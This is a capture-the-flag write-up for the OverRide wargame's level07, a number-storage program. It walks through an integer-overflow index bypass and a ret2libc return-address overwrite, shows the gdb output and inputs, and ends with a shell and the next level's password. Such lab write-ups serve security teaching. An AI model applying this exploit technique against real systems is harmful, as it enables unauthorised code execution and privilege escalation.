Here the program is a number storage. It has 3 command : store, read and quit.
The store function will get from a scanf an unsigned int.
Then it will store it in a buffer of unsigned int.
But we see there is a verification.
Indeed as the program said wil has reserved some storage.
And every 3 index are reserved, which are 0, 3, 6, 9 etc.
So if our index % 3 == 0 it will get denied.

We see that there is no protection when the data is stored. It is stored at data[index].
Which means we are going to be able to overwrite the return address of the main function.

So first we will calculate the offset of the eip.

Breakpoint 1, 0x0804892b in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd630:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd628, args:
 Locals at 0xffffd628, Previous frame's sp is 0xffffd630
 Saved registers:
  ebx at 0xffffd61c, ebp at 0xffffd628, esi at 0xffffd620, edi at 0xffffd624, eip at 0xffffd62c

eip at 0xffffd62c

Filling the array and displaying the stack

Input command: store
 Number: 1
 Index: 1

(gdb) x/20x $sp
0xffffd440:     0xffffd464      0x00000014      0xf7fcfac0      0xf7fdc714
0xffffd450:     0x00000098      0xffffffff      0xffffd720      0xffffd6c8
0xffffd460:     0x00000000      0x00000000      0x00000001      0x00000000
0xffffd470:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd480:     0x00000000      0x00000000      0x00000000      0x00000000

The array address is 0xffffd464
(We filled index 1 but it start at index 0 but 0 % 3 = 0 so it's denied)

So the offset is :

0xffffd62c - 0xffffd464 = 1c8
1c8 = 456 in decimal.
456/4 = 114 (it is a buffer of int and the size of an it is 4 bytes)
Offset = 114


So we want to store whatever we want to overwrite the return address at the index 114.
But huge probleme here 114 % 3 = 0.
So the access of this index is denied

By overflowing the int we will need to give a number which is not a multiple of 3.

With a little program we find 3 int that may work : 1073741938, 2147483762, 3221225586

So we found a way to write at the offset 114.

So what we want to do here is overwrite the return address and instead execute a shell.

Thanks to gdb we can find in the libc an address that points to a system call, and a string where is stored "/bin/sh"

(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>

(gdb) find &system,999999999999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

At the address 0xf7e6aed0 there is a call to system, and at the address 0xf7f897ec a string that cointains "/bin/sh"

So we have two parameters, the call of system that we'll want to write at eip and his parameter "/bin/sh" at eip+2.

Has we found earlier we have 3 int that are a replacement for 114 but we need to checks they are also valide for their value + 2.
(1073741938 + 2) % 3 = 0; not good.
(2147483762 + 2) % 3 = 1; a suitable replacement.

So let's convert address we found earlier in decimal : 0xf7e6aed0 = 4159090384 and 0xf7f897ec = 4160264172.

So we are going to store the value 4159090384 at index 2147483762 and the value 4160264172 at index 2147483762 + 2 = 2147483764.


level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 2147483764
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC


